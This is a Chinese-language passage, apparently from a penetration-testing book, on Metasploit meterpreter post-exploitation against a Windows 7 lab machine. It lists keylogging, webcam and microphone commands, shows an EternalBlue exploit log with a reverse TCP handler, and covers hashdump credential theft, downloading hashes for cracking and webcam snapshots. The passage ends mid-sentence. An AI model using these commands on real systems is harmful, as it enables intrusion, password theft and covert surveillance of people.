
即使我们将搜索范围缩小到仅限 Windows 系统，Metasploit 中仍有相当多（超过 200 个）的后渗透模块可供我们使用。

除了众多的后渗透模块外，Metasploit 的 meterpreter 还内置了许多命令。在 meterpreter 提示符下，我们只需输入 `help` 即可查看适用于当前 meterpreter 的命令。这些命令并非在所有 meterpreter 中通用，而是针对每个特定的 meterpreter 而设计的。这意味着我们需要输入 `help` 来查看哪些命令适用于当前使用的 meterpreter（请记住，存在许多不同的 meterpreter）。

```
meterpreter> help
```

这个列表相当长，但这些都是 meterpreter 的核心命令。如果我们往下滚动，可以看到一些用于后渗透的关键命令，包括标准的“用户界面命令”、“网络摄像头命令”和“音频输出命令”。

**核心命令**

| 命令 | 描述 |
| :--- | :--- |
| `?` | 帮助菜单 |
| `background` | 将当前会话置于后台 |
| `bg` | background 的别名 |
| `bgkill` | 终止后台运行的 meterpreter 脚本 |
| `bglst` | 列出正在运行的后台脚本 |
| `bgrun` | 作为后台线程执行 meterpreter 脚本 |
| `channel` | 显示信息或控制活动通道 |
| `close` | 关闭通道 |
| `detach` | 分离 meterpreter 会话（适用于 http/https） |
| `disable_unicode_encoding` | 禁用 Unicode 字符串编码 |
| `enable_unicode_encoding` | 启用 Unicode 字符串编码 |
| `exit` | 终止 meterpreter 会话 |
| `get_timeouts` | 获取当前会话的超时值 |
| `guid` | 获取会话 GUID |
| `help` | 帮助菜单 |
| `info` | 显示有关 Post 模块的信息 |
| `irb` | 在当前会话上打开交互式 Ruby shell |
| `load` | 加载一个或多个 meterpreter 扩展 |
| `machine_id` | 获取连接到该会话的机器的 MSF ID |
| `migrate` | 将服务器迁移到另一个进程 |
| `pivot` | 管理中转监听器 |
| `pry` | 在当前会话上打开 Pry 调试器 |
| `quit` | 终止 meterpreter 会话 |
| `read` | 从通道读取数据 |
| `resource` | 执行存储文件中的命令 |
| `run` | 执行 meterpreter 脚本或 Post 模块 |
| `secure` | （重新）协商会话上的 TLV 数据包加密 |
| `sessions` | 快速切换到另一个会话 |
| `set_timeouts` | 设置当前会话的超时值 |
| `sleep` | 强制 Meterpreter 保持静默，然后重新建立会话。 |
| `transport` | 更改当前传输机制 |
| `use` | "load" 的弃用别名 |
| `uuid` | 获取当前会话的 UUID |
| `write` | 将数据写入通道 |

**Stdapi：用户界面命令**

| 命令 | 描述 |
| :--- | :--- |
| `enumdesktops` | 列出所有可访问的桌面和窗口站 |
| `getdesktop` | 获取当前 meterpreter 桌面 |
| `idletime` | 返回远程用户空闲的秒数 |
| `keyboard_send` | 发送按键击打 |
| `keyscan_dump` | 转储按键缓冲区 |
| `keyscan_start` | 开始捕获按键 |
| `keyscan_stop` | 停止捕获按键 |
| `mouse` | 发送鼠标事件 |
| `screenshare` | 实时查看远程用户的桌面 |
| `screenshot` | 获取交互式桌面的屏幕截图 |
| `setdesktop` | 更改 meterpreter 的当前桌面 |
| `uiictl` | 控制部分用户界面组件 |

**Stdapi：网络摄像头命令**

| 命令 | 描述 |
| :--- | :--- |
| `record_mic` | 从默认麦克风录制 X 秒的音频 |
| `webcam_chat` | 开始视频聊天 |
| `webcam_list` | 列出网络摄像头 |
| `webcam_snap` | 从指定的网络摄像头拍摄快照 |
| `webcam_stream` | 播放来自指定网络摄像头的视频流 |

**Stdapi：音频输出命令**

| 命令 | 描述 |
| :--- | :--- |
| `play` | 在目标系统上播放音频文件，磁盘上未写入任何内容 |

我想强调的是，这些命令因使用的 meterpreter 而异，因此如果您使用的是不同的 meterpreter，请尝试 `help` 命令。其中许多命令在 Linux/UNIX 及其他操作系统（Linux、BSD、UNIX 等）的 meterpreter 中是不可用的。

让我们开始进行后渗透并获取战利品吧！

## Windows 7 中的利用

在第 9 章中，我们使用 NSA 的 EternalBlue 漏洞利用工具攻击了我们的 Windows 7 系统，并获得了 meterpreter 提示符，如下所示。

```
msf exploit(ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.1.101:4444
[*] 192.168.1.103:445 - Connecting to target for exploitation.
[+] 192.168.1.103:445 - Connection established for exploitation.
[+] 192.168.1.103:445 - Target OS selected valid by OS indicated by SMB reply
[*] 192.168.1.103:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61
   6d 61  Windows 7 Ultimate
[*] 192.168.1.103:445 - 0x00000010  74 65 20 74 65 20 74 65 20 74 65 20 74 65 20 74
   65 20  7601 Service Pack 1
[*] 192.168.1.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.103:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.103:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.103:445 - Starting non-paged pool grooming
[*] 192.168.1.103:445 - Sending SMBv2 buffers
[*] 192.168.1.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.103:445 - Sending final SMBv2 buffers.
[*] 192.168.1.103:445 - Sending last fragment of exploit packet!
```

```
meterpreter > idletime
User has been idle for: 48 mins 56 secs
meterpreter >
```

现在我们已经取得了目标系统上的 meterpreter 权限，让我们看看可以在内部做些什么。在某些情况下，我们可能希望知道系统是否处于空闲状态以及空闲了多长时间。如果有人在操作该系统，被检测的可能性会增加，尽管我们的活动对于用户来说并不明显，除非他们使用诸如 Windows 任务管理器、Sysinternals 进程监视器或类似工具。

要了解系统已空闲多长时间，我们可以使用内置命令 `idletime`。

```
meterpreter > idletime
```

如您所见，该系统仅空闲了 48 分 56 秒。系统所有者很可能就在附近。谨慎总比丧命好！

如果我们在目标系统上拥有系统管理员权限——就像使用 EternalBlue 漏洞利用工具那样——我们只需使用 `hashdump` 命令即可获取所有密码的所有哈希值。

```
meterpreter > hashdump
```

```
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaae8fb117ad06bdd830b7586c:::
ASPNET:1007:b5a564bc22934f4cb2a6edbb0b98952d6:0f3903151a9afc1afdec9d87a583a48c:::
Guest:501:aad3b435b51404eeaaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
hacker:1010:2ad6d62a57cbe4ddaad3b435b51404ee:a5dc24b1999182b03438ffdaed8d5312:::
IUSR_2K3TARGET:1003:7e24a98ab6dd72ec8ae00eb86c8bb2b8:1900f037b4072bbce07b9e3bb7b4f8ea:::
IWAM_2K3TARGET:1004:071d6126daf6116deb7c5ba280de2f26:1071c94e0321e6deed014d9a5dfcf021:::
SQLDebugger:1009:aad3b435b51404eeaaad3b435b51404ee:73773ed7bd7af499c968a9552eb4540b:::
SUPPORT_388945a0:1001:aad3b435b51404eeaaad3b435b51404ee:0d1cca0a07f89506e188199d4cdf2151:::
meterpreter >
```

```
meterpreter > webcam_list
1: VirtualBox Webcam - HP TrueVision HD
```

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_409_0.png)

既然我们有了这些哈希值，我们可以下载它们，并使用 Kali 中众多密码破解工具之一（如 hashcat）进行破解。要将这些哈希值捕获到文件中，只需输入：`meterpreter > hashdump > hashes`。然后，使用 meterpreter 中内置的 `download` 命令。

```
meterpreter > download hashes
```

此外，我们的间谍/情报机构可能希望查看计算机所在房间发生的情况。meterpreter 有一个命令可以打开网络摄像头并拍摄一张快照。它被称为 `webcam_snap`。在使用它之前，我们需要检查系统上是否存在网络摄像头以及操作系统分配给它的编号。我们可以使用 `webcam_list` 命令来执行此操作。

```
meterpreter> webcam_list
```

正如上面屏幕截图中所见，目标系统有一个网络摄像头，并且它被

